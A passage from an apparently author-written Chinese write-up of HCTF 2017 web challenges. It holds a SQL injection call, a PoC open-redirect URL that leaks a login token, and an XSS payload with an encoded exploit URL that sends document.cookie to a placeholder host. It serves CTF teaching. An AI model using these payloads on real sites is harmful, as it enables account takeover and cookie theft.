        req <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">=</span> url<span class="token punctuation">)</span>
        print req<span class="token punctuation">.</span>content

    <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">getSign</span></span><span class="token punctuation">(</span>user_account<span class="token punctuation">,</span> valid_date<span class="token punctuation">)</span><span class="token punctuation">:</span>
        user_account <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>user_account<span class="token punctuation">)</span>
        encryKey <span class="token operator">=</span> <span class="token string">&apos;7sl+kb9adDAc7gLuv31MeEFPBMJZdRZyAx9eEmXSTui4423hgGfXF1pyM&apos;</span>
        sign <span class="token operator">=</span> getMd5<span class="token punctuation">(</span>str<span class="token punctuation">(</span>user_account<span class="token punctuation">)</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>valid_date<span class="token punctuation">)</span> <span class="token operator">+</span> encryKey<span class="token punctuation">)</span>
        <span class="token keyword">return</span> sign

    hack<span class="token punctuation">(</span><span class="token string">&quot;adminss&apos; union all select 111,flag from hctf.flag2#&quot;</span><span class="token punctuation">)</span></code></pre><p>flag&#x5C31;&#x5728;hctf&#x5E93;&#x91CC;&#x7684;hctf2&#x8868;&#x91CC;&#x3002;<br>&#x800C;&#x5927;&#x5BB6;&#x627E;&#x5230;&#x7684;&#x5176;&#x4ED6;&#x6CE8;&#x5165;&#x70B9;</p> <h3 id="a-world-restored--a-world-restored-again">A World Restored &amp; A World Restored Again</h3> <pre><code>    <span class="token constant">A</span> <span class="token constant">World</span> <span class="token constant">Restored</span>
    <span class="token constant">Description</span><span class="token punctuation">:</span>
    nothing here <span class="token keyword">or</span> all the here ps<span class="token symbol">:flag</span> <span class="token keyword">in</span> admin cookie 
    flag is login as admin
    <span class="token constant">URL</span> http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>messbox<span class="token punctuation">.</span><span class="token number">2017.</span>hctf<span class="token punctuation">.</span>io
    <span class="token constant">Now</span> <span class="token constant">Score</span> <span class="token number">674.44</span>
    <span class="token constant">Team</span> solved <span class="token number">7</span>

    <span class="token constant">A</span> <span class="token constant">World</span> <span class="token constant">Restored</span> <span class="token constant">Again</span>
    <span class="token constant">Description</span><span class="token punctuation">:</span> 
    <span class="token constant">New</span> <span class="token class-name">Challenge</span> <span class="token operator">!</span><span class="token operator">!</span> 
    hint<span class="token punctuation">:</span> flag only from admin bot
    <span class="token constant">URL</span> http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>messbox<span class="token punctuation">.</span><span class="token number">2017.</span>hctf<span class="token punctuation">.</span>io
    <span class="token constant">Now</span> <span class="token constant">Score</span> <span class="token number">702.6</span>
    <span class="token constant">Team</span> solved <span class="token number">6</span></code></pre><p>A World Restored&#x5728;&#x51FA;&#x9898;&#x601D;&#x8DEF;&#x672C;&#x8EAB;&#x662F;&#x6765;&#x81EA;&#x4E8E;uber&#x5728;10&#x6708;14&#x53F7;&#x516C;&#x5F00;&#x7684;&#x4E00;&#x4E2A;&#x6F0F;&#x6D1E;<a href="https://stamone-bug-bounty.blogspot.jp/2017/10/dom-xss-auth_14.html"target="_blank">https://stamone-bug-bounty.blogspot.jp/2017/10/dom-xss-auth_14.html</a>&#xFF0C;&#x4E3A;&#x4E86;&#x80FD;&#x5C3D;&#x53EF;&#x80FD;&#x7684;&#x6A21;&#x62DF;&#x771F;&#x5B9E;&#x73AF;&#x5883;&#xFF0C;&#x6211;&#x8FD9;&#x4E2A;&#x4E0D;&#x4E13;&#x4E1A;&#x7684;Web&#x5F00;&#x53D1;&#x53EA;&#x80FD;&#x5F3A;&#x884C;&#x4E0A;&#x624B;&#x5B9E;&#x73B0;&#x7AD9;&#x5E93;&#x5206;&#x79BB;&#x3002;</p> <p>&#x5176;&#x4E2D;&#x7684;&#x4E00;&#x90E8;&#x5206;&#x975E;&#x9884;&#x671F;&#xFF0C;&#x4E5F;&#x90FD;&#x662F;&#x56E0;&#x4E3A;&#x7AD9;&#x5E93;&#x5206;&#x79BB;&#x5B9E;&#x73B0;&#x7684;&#x4E0D;&#x597D;&#x800C;&#x5BFC;&#x81F4;&#x7684;&#x3002;&#xFF08;&#x66F4;&#x5F00;&#x653E;&#x7684;&#x9898;&#x76EE;&#x73AF;&#x5883;&#xFF0C;&#x5BFC;&#x81F4;&#x4E86;&#x5F88;&#x591A;&#x53EF;&#x80FD;&#xFF0C;&#x6216;&#x8BB8;&#x8FD9;&#x6CA1;&#x4EC0;&#x4E48;&#x4E0D;&#x597D;&#x7684;&#xFF1F;</p> <p>&#x6574;&#x4E2A;&#x7AD9;&#x7684;&#x7ED3;&#x6784;&#x662F;&#x8FD9;&#x6837;&#x7684;&#xFF1A;<br>1&#x3001;auth&#x7AD9;&#x8D1F;&#x8D23;&#x7528;&#x6237;&#x6570;&#x636E;&#x7684;&#x5904;&#x7406;&#xFF0C;&#x5305;&#x62EC;&#x767B;&#x9646;&#x9A8C;&#x8BC1;&#x3001;&#x6CE8;&#x518C;&#x7B49;&#xFF0C;&#x662F;&#x6570;&#x636E;&#x5E93;&#x6240;&#x5728;&#x7AD9;&#x3002;<br>2&#x3001;messbox&#x7AD9;&#x8D1F;&#x8D23;&#x7528;&#x6237;&#x7684;&#x5404;&#x79CD;&#x64CD;&#x4F5C;&#xFF0C;&#x4F46;&#x4E0D;&#x8FDE;&#x63A5;&#x6570;&#x636E;&#x5E93;&#x3002;</p> <p>&#x8FD9;&#x91CC;auth&#x7AD9;&#x4E0E;messbox&#x7AD9;&#x5C5E;&#x4E8E;&#x4E24;&#x4E2A;&#x5B8C;&#x5168;&#x4E0D;&#x540C;&#x7684;&#x57DF;&#xFF0C;&#x53D7;&#x5230;<strong>&#x540C;&#x6E90;&#x7B56;&#x7565;</strong>&#x7684;&#x5F71;&#x54CD;&#xFF0C;&#x6211;&#x4EEC;&#x5C31;&#x9700;&#x8981;&#x6709;&#x529E;&#x6CD5;&#x6765;&#x6C9F;&#x901A;&#x4E24;&#x4E2A;&#x7AD9;&#x3002;</p> <p>&#x800C;&#x8FD9;&#x91CC;&#xFF0C;&#x6211;&#x9009;&#x62E9;&#x4F7F;&#x7528;token&#x505A;&#x7528;&#x6237;&#x767B;&#x9646;&#x7684;&#x6821;&#x9A8C;+jsonp&#x6765;&#x83B7;&#x53D6;&#x7528;&#x6237;&#x6570;&#x636E;&#x3002;&#x7AD9;&#x70B9;&#x7ED3;&#x6784;&#x5982;&#x4E0B;:</p> <p> <a href="http://static.zybuluo.com/LoRexxar/bp6f3b81h84qt19qc00ws80q/image.png"target="_blank"class="fancybox"rel="grouped"title=""> <img alt=""class="img-responsive lazy"data-original="http://static.zybuluo.com/LoRexxar/bp6f3b81h84qt19qc00ws80q/image.png"height="100%"src="https://www.ctfwp.com/gitbook/gitbook-plugin-lazyload/loading.gif"> </a></p> <p>&#x7B80;&#x5355;&#x6765;&#x8BF4;&#x5C31;&#x662F;&#xFF0C;messbox&#x767B;&#x9646;&#x8D26;&#x53F7;&#x5B8C;&#x5168;&#x53D7;&#x5230;token&#x6821;&#x9A8C;&#xFF0C;&#x5373;&#x4F7F;&#x4F60;&#x5728;&#x5B8C;&#x5168;&#x4E0D;&#x77E5;&#x9053;&#x8D26;&#x53F7;&#x5BC6;&#x7801;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x83B7;&#x53D6;&#x8BE5;token&#x5C31;&#x53EF;&#x4EE5;&#x767B;&#x9646;&#x8D26;&#x53F7;&#x3002;</p> <p>&#x90A3;&#x4E48;&#x600E;&#x4E48;&#x83B7;&#x53D6;token&#x767B;&#x9646;admin&#x8D26;&#x53F7;&#x5C31;&#x662F;&#x7B2C;&#x4E00;&#x9898;&#x3002;</p> <p>&#x800C;&#x7B2C;&#x4E8C;&#x9898;&#xFF0C;&#x6F0F;&#x6D1E;&#x70B9;&#x5C31;&#x662F;&#x4E0A;&#x9762;&#x6587;&#x7AE0;&#x4E2D;&#x5199;&#x7684;&#x90A3;&#x6837;&#xFF0C;&#x53CD;&#x5C04;&#x6027;&#x7684;domxss&#xFF0C;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x670D;&#x52A1;&#x7AEF;&#x7684;flag&#x3002;</p> <p>&#x4E3A;&#x4E86;&#x4E24;&#x4E2A;flag&#x4E92;&#x4E0D;&#x5E72;&#x6270;&#xFF0C;&#x6211;&#x5BF9;&#x670D;&#x52A1;&#x7AEF;&#x505A;&#x4E86;&#x4E00;&#x5B9A;&#x7684;&#x5904;&#x7406;&#xFF0C;&#x670D;&#x52A1;&#x7AEF;&#x8D1F;&#x8D23;&#x5904;&#x7406;flag&#x7684;&#x4EE3;&#x7801;&#x5982;&#x4E0B;&#xFF1A;</p> <pre><code>    <span class="token variable">$flag1</span> <span class="token operator">=</span> <span class="token string">&quot;hctf{xs5_iz_re4lly_complex34e29f}&quot;</span><span class="token punctuation">;</span>
    <span class="token variable">$flag2</span> <span class="token operator">=</span> <span class="token string">&quot;hctf{mayb3_m0re_way_iz_best_for_ctf}&quot;</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>empty<span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">&apos;user&apos;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">&apos;user&apos;</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">&apos;hctf_admin_LoRexxar2e23322&apos;</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
                    setcookie<span class="token punctuation">(</span><span class="token string">&quot;flag&quot;</span><span class="token punctuation">,</span> <span class="token variable">$flag</span><span class="token punctuation">,</span> time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">3600</span><span class="token operator">*</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token string">&quot; &quot;</span><span class="token punctuation">,</span><span class="token string">&quot;messbox.2017.hctf.io&quot;</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>

        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">&apos;user&apos;</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string">&apos;hctf_admin_LoRexxar2e23322&apos;</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">&apos;check&apos;</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">&quot;233e&quot;</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            setcookie<span class="token punctuation">(</span><span class="token string">&quot;flag2&quot;</span><span class="token punctuation">,</span> <span class="token variable">$flag2</span><span class="token punctuation">,</span> time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">3600</span><span class="token operator">*</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token string">&quot; &quot;</span><span class="token punctuation">,</span><span class="token string">&quot;.2017.hctf.io&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span></code></pre><p>&#x53EF;&#x4EE5;&#x5F88;&#x660E;&#x663E;&#x7684;&#x770B;&#x51FA;&#x6765;&#xFF0C;flag1&#x662F;httponly&#x5E76;&#x5728;messbox&#x57DF;&#x4E0B;&#xFF0C;&#x53EA;&#x80FD;&#x767B;&#x9646;&#x624D;&#x80FD;&#x67E5;&#x770B;&#x3002;flag2&#x6211;&#x8BBE;&#x7F6E;&#x4E86;check&#x4F4D;&#xFF0C;&#x53EA;&#x6709;bot&#x624D;&#x4F1A;&#x8BBF;&#x95EE;&#x8FD9;&#x4E2A;&#x9875;&#x9762;&#xFF0C;&#x8FD9;&#x6837;&#x53EA;&#x6709;&#x901A;&#x8FC7;&#x53CD;&#x5C04;&#x6027;xss&#xFF0C;&#x624D;&#x80FD;&#x5F97;&#x5230;flag&#x3002;</p> <p>&#x4E0B;&#x9762;&#x6211;&#x4EEC;&#x56DE;&#x5230;&#x9898;&#x76EE;&#x3002;</p> <h4 id="a-world-restored">A World Restored</h4> <pre><code>    <span class="token constant">A</span> <span class="token constant">World</span> <span class="token constant">Restored</span>
    <span class="token constant">Description</span><span class="token punctuation">:</span>
    nothing here <span class="token keyword">or</span> all the here ps<span class="token symbol">:flag</span> <span class="token keyword">in</span> admin cookie 
    flag is login as admin
    <span class="token constant">URL</span> http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>messbox<span class="token punctuation">.</span><span class="token number">2017.</span>hctf<span class="token punctuation">.</span>io
    <span class="token constant">Now</span> <span class="token constant">Score</span> <span class="token number">674.44</span>
    <span class="token constant">Team</span> solved <span class="token number">7</span></code></pre><p>&#x8FD9;&#x9053;&#x9898;&#x76EE;&#x5728;&#x6BD4;&#x8D5B;&#x7ED3;&#x675F;&#x65F6;&#xFF0C;&#x53EA;&#x6709;7&#x53EA;&#x961F;&#x4F0D;&#x6700;&#x7EC8;&#x5B8C;&#x6210;&#x4E86;&#xFF0C;&#x975E;&#x5E38;&#x51FA;&#x4E4E;&#x6211;&#x7684;&#x610F;&#x6599;&#xFF0C;&#x56E0;&#x4E3A;&#x6F0F;&#x6D1E;&#x672C;&#x8EAB;&#x975E;&#x5E38;&#x6709;&#x610F;&#x601D;&#x3002;&#xFF08;&#x8FD9;&#x4E2A;&#x6F0F;&#x6D1E;&#x662F;ROIS&#x53D1;&#x73B0;&#x7684;&#xFF09;</p> <p>&#x4E3A;&#x4E86;&#x80FD;&#x591F;&#x5B9E;&#x73B0;token&#xFF0C;&#x6211;&#x8BBE;&#x5B9A;&#x4E86;token&#x4E0D;&#x53EF;&#x9006;&#x7684;&#x4E8C;&#x91CD;&#x9A8C;&#x8BC1;&#x7B56;&#x7565;&#xFF0C;&#x4F46;&#x662F;&#x5728;&#x9898;&#x76EE;&#x4E2D;&#x6211;&#x52A0;&#x5165;&#x4E86;&#x4E00;&#x4E2A;&#x7279;&#x6B8A;&#x7684;&#x63A5;&#x53E3;&#xFF0C;&#x8BA9;&#x6211;&#x4EEC;&#x56DE;&#x987E;&#x4E00;&#x4E0B;&#x3002;</p> <p>auth&#x57DF;&#x4E2D;&#x7684;login.php&#xFF0C;&#x6211;&#x52A0;&#x5165;&#x4E86;&#x8FD9;&#x6837;&#x4E00;&#x6BB5;&#x4EE3;&#x7801;</p> <pre><code>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>empty<span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">&apos;n_url&apos;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token variable">$n_url</span> <span class="token operator">=</span> trim<span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">&apos;n_url&apos;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            echo <span class="token string">&quot;&lt;script nonce=&apos;{$random}&apos;&gt;window.location.href=&apos;&quot;</span><span class="token punctuation">.</span><span class="token variable">$n_url</span><span class="token punctuation">.</span><span class="token string">&quot;?token=&quot;</span><span class="token punctuation">.</span><span class="token variable">$usertoken</span><span class="token punctuation">.</span><span class="token string">&quot;&apos;&lt;/script&gt;&quot;</span><span class="token punctuation">;</span>
            exit<span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
            <span class="token operator">/</span><span class="token operator">/</span> header<span class="token punctuation">(</span><span class="token string">&quot;location: http://messbox.hctf.com?token=&quot;</span><span class="token punctuation">.</span><span class="token variable">$usertoken</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            echo <span class="token string">&quot;&lt;script nonce=&apos;{$random}&apos;&gt;window.location.href=&apos;http://messbox.2017.hctf.io?token=&quot;</span><span class="token punctuation">.</span><span class="token variable">$usertoken</span><span class="token punctuation">.</span><span class="token string">&quot;&apos;&lt;/script&gt;&quot;</span><span class="token punctuation">;</span>
            exit<span class="token punctuation">;</span>
        <span class="token punctuation">}</span></code></pre><p>&#x8FD9;&#x6BB5;&#x4EE3;&#x7801;&#x4E5F;&#x662F;&#x4E24;&#x4E2A;&#x6F0F;&#x6D1E;&#x7684;&#x6838;&#x5FC3;&#x6F0F;&#x6D1E;&#x70B9;&#xFF0C;&#x5047;&#x8BBE;&#x4F60;&#x5728;&#x672A;&#x767B;&#x5F55;&#x72B6;&#x6001;&#x4E0B;&#x8BBF;&#x95EE;messbox&#x57DF;&#x4E0B;&#x7684;user.php&#x6216;&#x8005;report.php&#x8FD9;&#x4E24;&#x4E2A;&#x9875;&#x9762;&#xFF0C;&#x90A3;&#x4E48;&#x56E0;&#x4E3A;&#x672A;&#x767B;&#x5F55;&#xFF0C;&#x9875;&#x9762;&#x4F1A;&#x8DF3;&#x8F6C;&#x5230;auth&#x57DF;&#x5E76;&#x643A;&#x5E26;n_url&#xFF0C;&#x5982;&#x679C;&#x83B7;&#x53D6;&#x5230;&#x767B;&#x9646;&#x72B6;&#x6001;&#xFF0C;&#x8FD9;&#x91CC;&#x5C31;&#x4F1A;&#x62FC;&#x63A5;token&#x4F20;&#x56DE;messbox&#x57DF;&#xFF0C;&#x5E76;&#x8D4B;&#x4E88;&#x767B;&#x9646;&#x72B6;&#x6001;&#x3002;</p> <p>&#x7B80;&#x5355;&#x7684;&#x6D41;&#x7A0B;&#x5982;&#x4E0B;&#xFF1A;</p> <pre><code>`&#x672A;&#x767B;&#x5F55;<span class="token operator">-</span><span class="token operator">&gt;</span>&#x83B7;&#x53D6;&#x5F53;&#x524D;<span class="token constant">URL</span><span class="token operator">-</span><span class="token operator">&gt;</span>&#x8DF3;&#x8F6C;&#x81F3;auth<span class="token operator">-</span><span class="token operator">&gt;</span>&#x83B7;&#x53D6;&#x767B;&#x9646;&#x72B6;&#x6001;<span class="token operator">-</span><span class="token operator">&gt;</span>&#x643A;&#x5E26;token&#x8DF3;&#x8F6C;&#x5230;&#x521A;&#x624D;&#x83B7;&#x53D6;&#x7684;<span class="token constant">URL</span><span class="token operator">-</span><span class="token operator">&gt;</span>messbox&#x767B;&#x9646;&#x6210;&#x529F;`</code></pre><p>&#x5F53;&#x7136;&#xFF0C;&#x8FD9;&#x5176;&#x4E2D;&#x662F;&#x6709;&#x6F0F;&#x6D1E;&#x7684;&#x3002;</p> <p>&#x670D;&#x52A1;&#x7AEF;bot&#x5FC5;&#x7136;&#x767B;&#x9646;&#x4E86;admin&#x8D26;&#x53F7;&#xFF0C;&#x5982;&#x679C;&#x6211;&#x4EEC;&#x76F4;&#x63A5;&#x8BF7;&#x6C42;login.php&#x5E76;&#x5236;&#x5B9A;&#x4E0B;&#x4E00;&#x6B65;&#x8DF3;&#x8F6C;&#x7684;URL&#xFF0C;&#x90A3;&#x4E48;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x83B7;&#x53D6;&#x62FC;&#x63A5;&#x4E0A;&#x7684;token&#xFF01;</p> <pre><code>poc

`http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>auth<span class="token punctuation">.</span><span class="token number">2017.</span>hctf<span class="token punctuation">.</span>io<span class="token operator">/</span>login<span class="token punctuation">.</span>php<span class="token operator">?</span>n_url<span class="token operator">=</span>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token punctuation">{</span>you_website<span class="token punctuation">}</span>`</code></pre><p>&#x5F97;&#x5230;token&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x767B;&#x9646;messbox&#x57DF;&#xFF0C;&#x6210;&#x529F;&#x767B;&#x9646;admin</p> <h4 id="a-world-restored-again">A World Restored Again</h4> <pre><code>    <span class="token constant">A</span> <span class="token constant">World</span> <span class="token constant">Restored</span> <span class="token constant">Again</span>
    <span class="token constant">Description</span><span class="token punctuation">:</span> 
    <span class="token constant">New</span> <span class="token class-name">Challenge</span> <span class="token operator">!</span><span class="token operator">!</span> 
    hint<span class="token punctuation">:</span> flag only from admin bot
    <span class="token constant">URL</span> http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>messbox<span class="token punctuation">.</span><span class="token number">2017.</span>hctf<span class="token punctuation">.</span>io
    <span class="token constant">Now</span> <span class="token constant">Score</span> <span class="token number">702.6</span>
    <span class="token constant">Team</span> solved <span class="token number">6</span></code></pre><p>&#x5230;&#x4E86;&#x7B2C;&#x4E8C;&#x90E8;&#xFF0C;&#x81EA;&#x7136;&#x5C31;&#x662F;xss&#x4E86;&#xFF0C;&#x5176;&#x5B9E;&#x9898;&#x76EE;&#x672C;&#x8EAB;&#x975E;&#x5E38;&#x7B80;&#x5355;&#xFF0C;&#x5728;&#x51FA;&#x9898;&#x4E4B;&#x521D;&#xFF0C;&#x4E3A;&#x4E86;&#x907F;&#x514D;&#x9898;&#x76EE;&#x51FA;&#x73B0;&#x201C;&#x5783;&#x573E;&#x65F6;&#x95F4;&#x201D;&#xFF08;&#x56E0;&#x4E3A;&#x975E;&#x9884;&#x671F;&#x5BFC;&#x81F4;&#x9898;&#x76EE;&#x4E0D;&#x53EF;&#x89E3;&#xFF09;&#xFF0C;&#x6211;&#x5728;&#x9898;&#x76EE;&#x4E2D;&#x52A0;&#x5165;&#x4E86;&#x8DDF;&#x591A;&#x5143;&#x7D20;&#x3002;</p> <p>&#x5E76;&#x628A;flag2&#x653E;&#x7F6E;&#x5728;<code><span class="token number">.2017</span><span class="token punctuation">.</span>hctf<span class="token punctuation">.</span>io</code>&#x57DF;&#x4E0B;&#xFF0C;&#x907F;&#x514D;&#x6709;&#x4EBA;&#x627E;&#x5230;messbox&#x7684;xss&#x4F46;&#x662F;&#x6253;&#x4E0D;&#x5230;flag&#x7684;&#x95EE;&#x9898;&#x3002;&#xFF08;&#x6CA1;&#x60F3;&#x5230;&#x771F;&#x7684;&#x7528;&#x4E0A;&#x4E86;&#xFF09;</p> <p>&#x8FD9;&#x91CC;&#x6211;&#x5C31;&#x7B80;&#x5355;&#x63CF;&#x8FF0;&#x4E0B;&#x9884;&#x671F;&#x89E3;&#x6CD5;&#x548C;&#x975E;&#x9884;&#x671F;&#x89E3;&#x6CD5;&#x4E24;&#x4E2A;&#x3002;</p> <h5 id="&#x9884;&#x671F;&#x89E3;&#x6CD5;">&#x9884;&#x671F;&#x89E3;&#x6CD5;</h5> <p>&#x9884;&#x671F;&#x89E3;&#x6CD5;&#x5F53;&#x7136;&#x6765;&#x81EA;&#x4E8E;&#x51FA;&#x9898;&#x601D;&#x8DEF;&#x3002;</p> <p><a href="https://stamone-bug-bounty.blogspot.jp/2017/10/dom-xss-auth_14.html"target="_blank">https://stamone-bug-bounty.blogspot.jp/2017/10/dom-xss-auth_14.html</a></p> <p>&#x6F0F;&#x6D1E;&#x672C;&#x8EAB;&#x975E;&#x5E38;&#x7B80;&#x5355;&#xFF0C;&#x4F46;&#x6709;&#x610F;&#x601D;&#x7684;&#x662F;&#x5229;&#x7528;&#x601D;&#x8DEF;&#x3002;</p> <p><strong>&#x5F53;&#x4F60;&#x53D1;&#x73B0;&#x4E86;&#x4E00;&#x4E2A;&#x4EFB;&#x610F;URL&#x8DF3;&#x8F6C;&#x7684;&#x6F0F;&#x6D1E;&#xFF0C;&#x4F1A;&#x4E0D;&#x4F1A;&#x8003;&#x8651;&#x6F0F;&#x6D1E;&#x662F;&#x600E;&#x4E48;&#x53D1;&#x751F;&#x7684;&#xFF1F;</strong></p> <p>&#x4E5F;&#x8BB8;&#x4F60;&#x5E73;&#x65F6;&#x53EF;&#x80FD;&#x6CA1;&#x6CE8;&#x610F;&#x8FC7;&#xFF0C;&#x4F46;&#x8DF3;&#x8F6C;&#x4E00;&#x822C;&#x662F;&#x5206;&#x4E24;&#x79CD;&#x7684;&#xFF0C;&#x7B2C;&#x4E00;&#x79CD;&#x662F;&#x670D;&#x52A1;&#x7AEF;&#x505A;&#x7684;&#xFF0C;&#x5229;&#x7528;<code>header<span class="token punctuation">:</span> location</code>,&#x8FD9;&#x79CD;&#x8DF3;&#x8F6C;&#x6211;&#x4EEC;&#x6CA1;&#x529E;&#x6CD5;&#x963B;&#x6B62;&#x3002;&#x7B2C;&#x4E8C;&#x79CD;&#x662F;js&#x4F7F;&#x7528;<code>location<span class="token punctuation">.</span>href</code>&#x5BFC;&#x81F4;&#x7684;&#x8DF3;&#x8F6C;&#x3002;</p> <p>&#x65E2;&#x7136;&#x662F;js&#x5B9E;&#x73B0;&#x7684;&#xFF0C;&#x90A3;&#x4E48;&#x662F;&#x4E0D;&#x662F;&#x6709;&#x53EF;&#x80FD;&#x5B58;&#x5728;dom xss&#x6F0F;&#x6D1E;&#x5462;&#xFF1F;</p> <p>&#x8FD9;&#x4E2A;uber&#x7684;&#x6F0F;&#x6D1E;&#x7531;&#x6765;&#x5C31;&#x662F;&#x5982;&#x6B64;&#x3002;</p> <p>&#x8FD9;&#x91CC;&#x552F;&#x4E00;&#x7684;&#x8003;&#x70B9;&#x5C31;&#x662F;&#xFF0C;js&#x662F;&#x4E00;&#x79CD;&#x987A;&#x5E8F;&#x6267;&#x884C;&#x7684;&#x8BED;&#x8A00;&#xFF0C;&#x5982;&#x679C;location&#x62A5;&#x9519;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x4E0D;&#x4F1A;&#x7EE7;&#x7EED;&#x6267;&#x884C;&#x540E;&#x9762;&#x7684;js&#xFF0C;&#x5982;&#x679C;location&#x4E0D;&#x62A5;&#x9519;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x53EF;&#x80FD;&#x5728;&#x6267;&#x884C;&#x4E0B;&#x4E00;&#x53E5;&#x4E4B;&#x524D;&#x8DF3;&#x8F6C;&#x8D70;&#x3002;</p> <p>&#x5F53;&#x7136;&#xFF0C;&#x529E;&#x6CD5;&#x5F88;&#x591A;&#x3002;&#x6700;&#x666E;&#x901A;&#x7684;&#x53EF;&#x80FD;&#x662F;&#x5728;location&#x540E;&#x4F7F;&#x7528;<code>stop<span class="token punctuation">(</span><span class="token punctuation">)</span></code>&#x6765;&#x963B;&#x6B62;&#x8DF3;&#x8F6C;&#xFF0C;&#x4F46;&#x6700;&#x597D;&#x7528;&#x7684;&#x5C31;&#x662F;&#x65B0;&#x5EFA;script&#x5757;&#xFF0C;&#x8FD9;&#x6837;&#x4E0A;&#x4E00;&#x4E2A;script&#x62A5;&#x9519;&#x4E0D;&#x4F1A;&#x5F71;&#x54CD;&#x5230;&#x4E0B;&#x4E00;&#x4E2A;script&#x5757;&#x3002;</p> <p>&#x6700;&#x7EC8;payload</p> <pre><code><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string">&quot;http://auth.hctf.com/getmessage.php?callback=window.location.href=&apos;http://xxx?cookie=&apos;+document.cookie;//&quot;</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script

exp

http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>auth<span class="token punctuation">.</span><span class="token number">2017.</span>hctf<span class="token punctuation">.</span>io<span class="token operator">/</span>login<span class="token punctuation">.</span>php<span class="token operator">?</span>n_url<span class="token operator">=</span><span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">2</span>fscript<span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>Cscript<span class="token operator">%</span><span class="token number">20</span>src<span class="token operator">%</span><span class="token number">3</span>D<span class="token operator">%</span><span class="token number">22</span>http<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">2</span>f<span class="token operator">%</span><span class="token number">2</span>fauth<span class="token punctuation">.</span><span class="token number">2017.</span>hctf<span class="token punctuation">.</span>io<span class="token operator">%</span><span class="token number">2</span>fgetmessage<span class="token punctuation">.</span>php<span class="token operator">%</span><span class="token number">3</span>Fcallback<span class="token operator">%</span><span class="token number">3</span>Dwindow<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">%</span><span class="token number">3</span>D<span class="token operator">%</span><span class="token number">27</span>http<span class="token operator">%</span><span class="token number">3</span>A<span class="token operator">%</span><span class="token number">2</span>f<span class="token operator">%</span><span class="token number">2</span>fxxx<span class="token operator">%</span><span class="token number">3</span>Fcookie<span class="token operator">%</span><span class="token number">3</span>D<span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">252</span>bdocument<span class="token punctuation">.</span>cookie<span class="token operator">%</span><span class="token number">3</span>B<span class="token operator">%</span><span class="token number">2</span>f<span class="token operator">%</span><span class="token number">2</span>f<span class="token operator">%</span><span class="token number">22</span><span class="token operator">%</span><span class="token number">3</span>E<span class="token operator">%</span><span class="token number">3</span>C<span class="token operator">%</span><span class="token number">2</span>fscript<span class="token operator">%</span><span class="token number">3</span>E</code></pre><h5 id="&#x975E;&#x9884;&#x671F;&#x89E3;&#x6CD5;">&#x975E;&#x9884;&#x671F;&#x89E3;&#x6CD5;</h5> 